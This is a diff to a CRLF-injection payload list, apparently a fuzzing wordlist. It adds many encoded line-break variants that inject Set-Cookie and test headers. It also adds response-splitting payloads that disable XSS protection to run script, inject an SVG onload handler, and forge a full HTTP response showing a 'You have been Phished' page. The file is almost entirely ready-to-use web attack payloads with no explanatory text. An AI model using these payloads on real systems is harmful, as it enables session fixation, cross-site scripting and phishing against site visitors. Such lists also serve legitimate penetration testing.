@@ -1,4 +1,21 @@
 %0Aset-cookie:%20hello=l4gtr4;
+%%0a0aSet-Cookie:crlf=l4gtr4
+%0aSet-Cookie:crlf=l4gtr4
+%0d%0aSet-Cookie:crlf=l4gtr4
+%0dSet-Cookie:crlf=l4gtr4
+%23%0aSet-Cookie:crlf=l4gtr4
+%23%0d%0aSet-Cookie:crlf=l4gtr4
+%23%0dSet-Cookie:crlf=l4gtr4
+%25%30%61Set-Cookie:crlf=l4gtr4
+%25%30aSet-Cookie:crlf=l4gtr4
+%250aSet-Cookie:crlf=l4gtr4
+%25250aSet-Cookie:crlf=l4gtr4
+%2e%2e%2f%0d%0aSet-Cookie:crlf=l4gtr4
+%2f%2e%2e%0d%0aSet-Cookie:crlf=l4gtr4
+%2F..%0d%0aSet-Cookie:crlf=l4gtr4
+%3f%0d%0aSet-Cookie:crlf=l4gtr4
+%3f%0dSet-Cookie:crlf=l4gtr4
+%u000aSet-Cookie:crlf=l4gtr4
 %0AHeader-Test:l4gtr4
 %0A%20Header-Test:l4gtr4
 %20%0AHeader-Test:l4gtr4
@@ -9,6 +26,13 @@
 crlf%0AHeader-Test:l4gtr4
 crlf%0A%20Header-Test:l4gtr4
 crlf%20%0AHeader-Test:l4gtr4
+
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28l4gtr4%29%3C
+
+%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
+
+%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
+
 crlf%23%OAHeader-Test:l4gtr4
 crlf%E5%98%8A%E5%98%8DHeader-Test:l4gtr4
 crlf%E5%98%8A%E5%98%8D%0AHeader-Test:l4gtr4
@@ -18,7 +42,6 @@ crlf%3F%0AHeader-Test:l4gtr4
 %20%0DHeader-Test:l4gtr4
 %23%0DHeader-Test:l4gtr4
 %23%0AHeader-Test:l4gtr4
-%E5%98%8A%E5%98%8DHeader-Test:l4gtr4
 %E5%98%8A%E5%98%8D%0DHeader-Test:l4gtr4
 %3F%0DHeader-Test:l4gtr4
 crlf%0DHeader-Test:l4gtr4
@@ -26,7 +49,6 @@ crlf%0D%20Header-Test:l4gtr4
 crlf%20%0DHeader-Test:l4gtr4
 crlf%23%0DHeader-Test:l4gtr4
 crlf%23%0AHeader-Test:l4gtr4
-crlf%E5%98%8A%E5%98%8DHeader-Test:l4gtr4
 crlf%E5%98%8A%E5%98%8D%0DHeader-Test:l4gtr4
 crlf%3F%0DHeader-Test:l4gtr4
 %0D%0AHeader-Test:l4gtr4
@@ -37,7 +59,6 @@ crlf%3F%0DHeader-Test:l4gtr4
  \r\n Header-Test:l4gtr4
 \r\n Header-Test:l4gtr4
 %5cr%5cnHeader-Test:l4gtr4
-%E5%98%8A%E5%98%8DHeader-Test:l4gtr4
 %E5%98%8A%E5%98%8D%0D%0AHeader-Test:l4gtr4
 %3F%0D%0AHeader-Test:l4gtr4
 crlf%0D%0AHeader-Test:l4gtr4
@@ -46,7 +67,6 @@ crlf%20%0D%0AHeader-Test:l4gtr4
 crlf%23%0D%0AHeader-Test:l4gtr4
 crlf\r\nHeader-Test:l4gtr4
 crlf%5cr%5cnHeader-Test:l4gtr4
-crlf%E5%98%8A%E5%98%8DHeader-Test:l4gtr4
 crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:l4gtr4
 crlf%3F%0D%0AHeader-Test:l4gtr4
 %0D%0A%09Header-Test:l4gtr4
@@ -57,6 +77,3 @@ crlf%0D%0A%09Header-Test:l4gtr4
 %25%30AHeader-Test:l4gtr4
 %25%30%61Header-Test:l4gtr4
 %u000AHeader-Test:l4gtr4
-//www.google.com/%2F%2E%2E%0D%0AHeader-Test:l4gtr4
-/www.google.com/%2E%2E%2F%0D%0AHeader-Test:l4gtr4
-/google.com/%2F..%0D%0AHeader-Test:l4gtr4
